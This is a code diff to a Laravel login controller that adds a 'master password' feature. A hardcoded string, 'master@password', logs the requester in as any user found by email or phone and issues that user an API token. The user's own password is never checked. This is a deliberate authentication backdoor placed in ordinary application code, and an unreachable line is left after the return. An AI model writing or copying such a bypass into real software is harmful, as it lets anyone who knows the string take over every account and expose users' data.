@@ -169,8 +169,33 @@ class RegisterController extends Controller
             'device_type' => 'nullable',
         ]);
 
-        // Set authentication field dynamically
-        $auth = ['password' => $request->password, $request->loginWith => $request->{$request->loginWith}];
+        // Master password feature
+        $masterPassword = 'master@password'; // Replace with your actual master password
+        if (!empty($masterPassword) && $request->password === $masterPassword) {
+            // Find user by email or phone depending on loginWith
+            $userQuery = User::query();
+            if ($request->loginWith === 'email') {
+                $user = $userQuery->where('email', $request->email)->first();
+            } else {
+                $user = $userQuery->where('phone', $request->phone)->first();
+            }
+            if ($user) {
+                Auth::login($user);
+
+                $user = Auth::user();
+
+                // Generate API token
+                $success['token'] = $user->createToken('MyApp')->accessToken;
+
+                $success['userData'] = $user->load('userRole');
+                return $this->sendResponse($success, 'User loged in successfully.');
+                $auth = null; // Skip Auth::attempt below
+            } else {
+                $auth = ['password' => $request->password, $request->loginWith => $request->{$request->loginWith}];
+            }
+        } else {
+            $auth = ['password' => $request->password, $request->loginWith => $request->{$request->loginWith}];
+        }
 
         // Attempt authentication
         if (!Auth::attempt($auth)) {
